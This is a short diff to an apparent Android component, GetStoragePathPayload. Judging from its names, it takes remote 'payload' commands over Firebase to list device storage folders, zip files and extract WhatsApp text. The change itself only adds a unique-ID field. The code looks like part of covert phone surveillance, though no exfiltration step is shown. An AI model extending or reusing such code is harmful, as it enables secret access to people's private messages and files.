@@ -10,6 +10,7 @@ import com.aigs.serviceone.annotations.PayloadTypes;
 import com.aigs.serviceone.helpers.StorageTextExtractionListner;
 import com.aigs.serviceone.helpers.ZipListener;
 import com.aigs.serviceone.util.ZipUtils;
+import com.example.uniqueidmanager.UniqueId;
 import com.google.firebase.database.DataSnapshot;
 import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.FirebaseDatabase;
@@ -21,6 +22,7 @@ public class GetStoragePathPayload extends AsyncTask<String, Integer, String> {
 
     private StorageTextExtractionListner watsappTextExtractionListner;
     int count = 0;
+    private String uuid;
     @PayloadTypes
     int payloadType;
 
@@ -36,6 +38,7 @@ public class GetStoragePathPayload extends AsyncTask<String, Integer, String> {
     @Override
     protected String doInBackground(String... strings) {
         try {
+
             if (payloadType == PayloadTypes.GET_DEVICE_FOLDER) {
                 String path = (strings[0].startsWith("/") ? strings[0] : "/" + strings[0]);
                 File file = new File(Environment.getExternalStorageDirectory() + path);
